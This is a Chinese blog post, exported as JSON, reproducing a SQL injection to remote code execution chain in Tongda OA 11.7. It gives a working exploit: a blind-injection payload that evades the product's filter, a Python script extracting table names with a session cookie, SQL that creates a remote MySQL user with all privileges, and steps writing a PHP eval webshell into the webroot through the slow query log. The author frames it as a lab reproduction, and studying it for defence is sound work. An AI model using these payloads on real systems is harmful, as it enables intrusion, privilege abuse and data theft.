{"title":"通达OA11.7后台sql注入到RCE复现","uid":"8e117461a44b784c60f14a08fb600518","slug":"通达OA11-7后台sql注入到RCE复现","date":"2020-09-26T12:15:21.000Z","updated":"2020-09-30T04:22:08.000Z","comments":true,"path":"api/articles/通达OA11-7后台sql注入到RCE复现.json","keywords":"A1andNS","cover":[],"content":"<h2 id=\"写在最前\"><a href=\"#写在最前\" class=\"headerlink\" title=\"写在最前\"></a>写在最前</h2><p>最近的Hvv期间爆出来一个通达OA的漏洞,红队大佬们太牛了.然后在网上看到了相关的一些文章,下面就实际来复现一下 </p>\n<h2 id=\"复现环境\"><a href=\"#复现环境\" class=\"headerlink\" title=\"复现环境\"></a>复现环境</h2><ul>\n<li>漏洞版本:通达OA11.7</li>\n<li>靶机系统:Winodws 7</li>\n</ul>\n<h2 id=\"漏洞详情\"><a href=\"#漏洞详情\" class=\"headerlink\" title=\"漏洞详情\"></a>漏洞详情</h2><p>这里想要看源码,和之前复现通达OA漏洞一样的,需要去找一个解码工具,才可以看到源代码.上次用到了一个叫Zend解密工具.</p>\n<p>下面看存在漏洞的代码:</p>\n<p>Windows平台下:<code>C://MYOA/webroot/general/hr/manage/query/delete_cascade.php</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200929124830.png\" alt=\"漏洞代码\"></p>\n<p>这里首先会先判断变量$condition_cascade时候为空,如果部位空就把变量内容中的<code>&#39;</code>替换为<code>&#39;</code> ,这里的代码可以看出来,没有对传递的参数做任何过滤,所以它存在sql注入的.</p>\n<p>这里是删除的功能,而且是无回显示机制,是盲注,所以可以试一下注入语句.</p>\n<p>(select 1 from (select sleep(5))a),结果当然没有一帆风顺.</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200929124901.png\" alt=\"尝试\"></p>\n<p>报了一个不安全的SQL语句,应该是触发了过滤机制了,过滤代码在/inc/conn.php中,如下图所示:</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200929124944.png\" alt=\"conn.php\"></p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$clean</span> <span class=\"token operator\">.=</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$db_string</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$old_pos</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$clean</span> <span class=\"token operator\">=</span> <span class=\"token function\">trim</span><span class=\"token punctuation\">(</span><span class=\"token function\">strtolower</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_replace</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\s+/s\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\" \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$clean</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$fail</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$matches</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span> <span class=\"token operator\">&lt;</span> <span class=\"token function\">strpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$clean</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"/*\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span><span class=\"token function\">strpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$clean</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"--\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!==</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span><span class=\"token function\">strpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$clean</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"#\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!==</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token variable\">$fail</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$error</span> <span class=\"token operator\">=</span> <span class=\"token function\">_</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"注释代码\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/(^|[^a-z])union(\\s+[a-z]*)*\\s+select($|[^[a-z])/s\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$clean</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token variable\">$fail</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$error</span> <span class=\"token operator\">=</span> <span class=\"token function\">_</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"联合查询\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/(^|[^a-z])(sleep|benchmark|load_file|mid|ord|ascii|extractvalue|updatexml|exp|current_user)\\s*\\(/s\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$clean</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$matches</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token variable\">$fail</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$error</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$matches</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/(^|[^a-z])into\\s+outfile($|[^[a-z])/s\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$clean</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token variable\">$fail</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$error</span> <span class=\"token operator\">=</span> <span class=\"token function\">_</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"生成文件\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/.*update.+user.+set.+file_priv.*/s\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$clean</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token variable\">$fail</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$error</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"set file_priv\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/.*case.+when.+then.+end.*/s\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$clean</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token variable\">$fail</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$error</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"case when\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/.*set.+general_log.*/s\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$clean</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token variable\">$fail</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$error</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"general_log\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$fail</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token keyword\">echo</span> <span class=\"token function\">_</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"不安全的SQL语句：\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$error</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"&lt;br />\"</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">echo</span> <span class=\"token function\">td_htmlspecialchars</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$db_string</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>在第二个else if模块中可以看到sleep()被过滤了,还有其他的一些函数被过滤了例如ascii(),ord()等函数.</p>\n<p>但是还是能够注入的,盲注中常见的substr和if函数都没有被过滤,所以这事就是一个机会了.用一些报错函数来作为判断依据.</p>\n<p>payload:</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">?condition_cascade&#x3D;select if((substr(database(),1,1)&#x3D;&#39;a&#39;),1,power(9999,9999))<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>当字符相等,不会报错,当字符不相等,就会报错.</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200929125025.png\" alt=\"成功\"></p>\n<p><img src=\"https://s1.ax1x.com/2020/09/29/0Z7ZW9.png\" alt=\"0Z7ZW9.png\"></p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> requests\n\ncookies <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"Cookie\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"KEY_RANDOMDATA=5256; PHPSESSID=fi7u0tsiutbj4emr7uiag4qhv1; SID_1=84a85250\"</span><span class=\"token punctuation\">&#125;</span>\nurl <span class=\"token operator\">=</span> <span class=\"token string\">\"http://192.168.90.128/general/hr/manage/query/delete_cascade.php\"</span>\nls <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\nresult <span class=\"token operator\">=</span> <span class=\"token string\">\"result is: \"</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">33</span><span class=\"token punctuation\">,</span> <span class=\"token number\">127</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    ls<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>ls<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> ls<span class=\"token punctuation\">:</span>\n        payload <span class=\"token operator\">=</span> <span class=\"token string\">'?condition_cascade=select+if((substr((select+table_name+from+information_schema.tables+where+table_schema=database()+limit+1,1),&#123;0&#125;,1)=\\'&#123;1&#125;\\'),1,power(9999,99))'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> j<span class=\"token punctuation\">)</span>\n        new_url <span class=\"token operator\">=</span> url<span class=\"token operator\">+</span>payload\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>new_url<span class=\"token punctuation\">)</span>\n        r <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>new_url<span class=\"token punctuation\">,</span> cookies<span class=\"token operator\">=</span>cookies<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> <span class=\"token string\">\"错误\"</span> <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span> r<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span>\n            result <span class=\"token operator\">+=</span> j\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">continue</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"getshell\"><a href=\"#getshell\" class=\"headerlink\" title=\"getshell\"></a>getshell</h2><p>通达OA的myasql用户是root用户,所以权限比较高,可以通过添加一个新用户,来让这个新的用户可以任意地址登陆.</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">grant all privileges ON mysql.* TO &#39;a1an&#39;@&#39;%&#39; IDENTIFIED BY &#39;abcABC@123&#39; WITH GRANT OPTION<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>然后还要<code>flush privileges</code>,才能使配置生效.然后添加的这个用户是对maysq数据库拥有所有权限的,接下来就要去连接数据库</p>\n<p>,然后给自己加权限:</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200929125750.png\" alt=\"连接mysql\"></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">UPDATE &#96;mysql&#96;.&#96;user&#96; SET &#96;Password&#96; &#x3D; &#39;*DE0742FA79F6754E99FDB9C8D2911226A5A9051D&#39;, &#96;Select_priv&#96; &#x3D; &#39;Y&#39;, &#96;Insert_priv&#96; &#x3D; &#39;Y&#39;, &#96;Update_priv&#96; &#x3D; &#39;Y&#39;, &#96;Delete_priv&#96; &#x3D; &#39;Y&#39;, &#96;Create_priv&#96; &#x3D; &#39;Y&#39;, &#96;Drop_priv&#96; &#x3D; &#39;Y&#39;, &#96;Reload_priv&#96; &#x3D; &#39;Y&#39;, &#96;Shutdown_priv&#96; &#x3D; &#39;Y&#39;, &#96;Process_priv&#96; &#x3D; &#39;Y&#39;, &#96;File_priv&#96; &#x3D; &#39;Y&#39;, &#96;Grant_priv&#96; &#x3D; &#39;Y&#39;, &#96;References_priv&#96; &#x3D; &#39;Y&#39;, &#96;Index_priv&#96; &#x3D; &#39;Y&#39;, &#96;Alter_priv&#96; &#x3D; &#39;Y&#39;, &#96;Show_db_priv&#96; &#x3D; &#39;Y&#39;, &#96;Super_priv&#96; &#x3D; &#39;Y&#39;, &#96;Create_tmp_table_priv&#96; &#x3D; &#39;Y&#39;, &#96;Lock_tables_priv&#96; &#x3D; &#39;Y&#39;, &#96;Execute_priv&#96; &#x3D; &#39;Y&#39;, &#96;Repl_slave_priv&#96; &#x3D; &#39;Y&#39;, &#96;Repl_client_priv&#96; &#x3D; &#39;Y&#39;, &#96;Create_view_priv&#96; &#x3D; &#39;Y&#39;, &#96;Show_view_priv&#96; &#x3D; &#39;Y&#39;, &#96;Create_routine_priv&#96; &#x3D; &#39;Y&#39;, &#96;Alter_routine_priv&#96; &#x3D; &#39;Y&#39;, &#96;Create_user_priv&#96; &#x3D; &#39;Y&#39;, &#96;Event_priv&#96; &#x3D; &#39;Y&#39;, &#96;Trigger_priv&#96; &#x3D; &#39;Y&#39;, &#96;Create_tablespace_priv&#96; &#x3D; &#39;Y&#39;, &#96;ssl_type&#96; &#x3D; &#39;&#39;, &#96;ssl_cipher&#96; &#x3D; &#39;&#39;, &#96;x509_issuer&#96; &#x3D; &#39;&#39;, &#96;x509_subject&#96; &#x3D; &#39;&#39;, &#96;max_questions&#96; &#x3D; 0, &#96;max_updates&#96; &#x3D; 0, &#96;max_connections&#96; &#x3D; 0, &#96;max_user_connections&#96; &#x3D; 0, &#96;plugin&#96; &#x3D; &#39;mysql_native_password&#39;, &#96;authentication_string&#96; &#x3D; &#39;&#39;, &#96;password_expired&#96; &#x3D; &#39;Y&#39; WHERE &#96;Host&#96; &#x3D; Cast(&#39;%&#39; AS Binary(1)) AND &#96;User&#96; &#x3D; Cast(&#39;a1an&#39; AS Binary(4));<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200929125725.png\" alt=\"权限\"></p>\n<p>下面从注入点刷新权限.</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">?condition_cacade&#x3D;flush privileges;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>接下来重新登陆,遇到了登陆不了的问题,还好大佬说明了这个情况如何解决,只要再次执行:</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">grant</span> <span class=\"token keyword\">all</span> <span class=\"token keyword\">privileges</span> <span class=\"token keyword\">ON</span> mysql<span class=\"token punctuation\">.</span><span class=\"token operator\">*</span> <span class=\"token keyword\">TO</span> <span class=\"token string\">'a1an'</span><span class=\"token variable\">@'%'</span> IDENTIFIED <span class=\"token keyword\">BY</span> <span class=\"token string\">'abcABC@123'</span> <span class=\"token keyword\">WITH</span> <span class=\"token keyword\">GRANT</span> <span class=\"token keyword\">OPTION</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>就好了,接下来继续:</p>\n<p><code>select @@basedir;</code>查一下路径.</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200929125701.png\" alt=\"查路径\"></p>\n<p>所以通达OA的web目录了就是<code>C:/MYOA/webroot</code>,下面写shell</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">set</span> <span class=\"token keyword\">global</span> slow_query_log<span class=\"token operator\">=</span><span class=\"token keyword\">on</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">set</span> <span class=\"token keyword\">global</span> slow_query_log_file<span class=\"token operator\">=</span><span class=\"token string\">'c:/MYOA/webroot/a1andns.php'</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">select</span> <span class=\"token string\">'&lt;?php eval($_POST['</span>cmd<span class=\"token string\">']);?>'</span> <span class=\"token operator\">or</span> sleep<span class=\"token punctuation\">(</span><span class=\"token number\">11</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200929125640.png\" alt=\"写shell\"></p>\n<p>下面就用antsword去连接一下</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200929125610.png\" alt=\"蚁剑\"></p>\n<p>成功连接上了webshell.所以如果利用该漏洞攻击者可以植入websheell,读取数据库数据等操作.</p>\n<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><p>[1]. <a href=\"https://www.77169.net/html/267833.html\">https://www.77169.net/html/267833.html</a></p>\n<p>[2]. <a href=\"https://www.anquanke.com/post/id/218407\">https://www.anquanke.com/post/id/218407</a></p>\n","text":"写在最前最近的Hvv期间爆出来一个通达OA的漏洞,红队大佬们太牛了.然后在网上看到了相关的一些文章,下面就实际来复现一下 复现环境 漏洞版本:通达OA11.7 靶机系统:Winodws 7 漏洞详情这里想要看源码,和之前复现通达OA漏洞一样的,需要去找一个解码工具,才可以看到源代...","link":"","photos":[],"count_time":{"symbolsCount":"5.6k","symbolsTime":"5 mins."},"categories":[{"name":"漏洞复现","slug":"漏洞复现","count":4,"path":"api/categories/漏洞复现.json"}],"tags":[{"name":"漏洞复现","slug":"漏洞复现","count":5,"path":"api/tags/漏洞复现.json"},{"name":"漏洞分析","slug":"漏洞分析","count":3,"path":"api/tags/漏洞分析.json"},{"name":"SQL","slug":"SQL","count":2,"path":"api/tags/SQL.json"},{"name":"RCE","slug":"RCE","count":5,"path":"api/tags/RCE.json"},{"name":"代码审计","slug":"代码审计","count":2,"path":"api/tags/代码审计.json"},{"name":"通达OA","slug":"通达OA","count":2,"path":"api/tags/通达OA.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%86%99%E5%9C%A8%E6%9C%80%E5%89%8D\"><span class=\"toc-text\">写在最前</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83\"><span class=\"toc-text\">复现环境</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E8%AF%A6%E6%83%85\"><span class=\"toc-text\">漏洞详情</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#getshell\"><span class=\"toc-text\">getshell</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99\"><span class=\"toc-text\">参考资料</span></a></li></ol>","author":{"name":"沐子龍","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"CTF之AWD学习","uid":"38fa6375660c17bc3d17395c4f749364","slug":"CTF之AWD学习","date":"2020-09-29T12:12:16.000Z","updated":"2021-06-17T02:54:10.418Z","comments":true,"path":"api/articles/CTF之AWD学习.json","keywords":"A1andNS","cover":[],"text":"AWDAWD(Attack With Defence),一种CTF赛制 三个特点: 实战性:真实网络安全防护设备设施加入抽象的网络环境中,模拟政企典型网络结构 对抗性:一种人人对抗的竞赛方式,考验参赛团队攻防兼备. 实时性:12-48小时不等,靶机数量根据比赛而定,其实时间也是根...","link":"","photos":[],"count_time":{"symbolsCount":"3.4k","symbolsTime":"3 mins."},"categories":[{"name":"CTF","slug":"CTF","count":42,"path":"api/categories/CTF.json"}],"tags":[{"name":"CTF","slug":"CTF","count":14,"path":"api/tags/CTF.json"},{"name":"AWD","slug":"AWD","count":1,"path":"api/tags/AWD.json"}],"author":{"name":"沐子龍","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"CTFHUB技能树WEB进阶","uid":"a03591ba90db85acdb8cd060417faa18","slug":"CTFHUB技能树WEB进阶","date":"2020-09-24T08:57:34.000Z","updated":"2020-10-01T10:41:22.000Z","comments":true,"path":"api/articles/CTFHUB技能树WEB进阶.json","keywords":"A1andNS","cover":[],"text":"LD_PRELOADLD_PRELOAD，是个环境变量，用于动态库的加载，动态库加载的优先级最高，一般情况下，其加载顺序为LD_PRELOAD&gt;LD_LIBRARY_PATH&gt;/etc/ld.so.cache&gt;/lib&gt;/usr/lib。应该比较接近win...","link":"","photos":[],"count_time":{"symbolsCount":"1.6k","symbolsTime":"1 mins."},"categories":[{"name":"CTF","slug":"CTF","count":42,"path":"api/categories/CTF.json"}],"tags":[{"name":"CTF","slug":"CTF","count":14,"path":"api/tags/CTF.json"},{"name":"WEB","slug":"WEB","count":39,"path":"api/tags/WEB.json"}],"author":{"name":"沐子龍","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}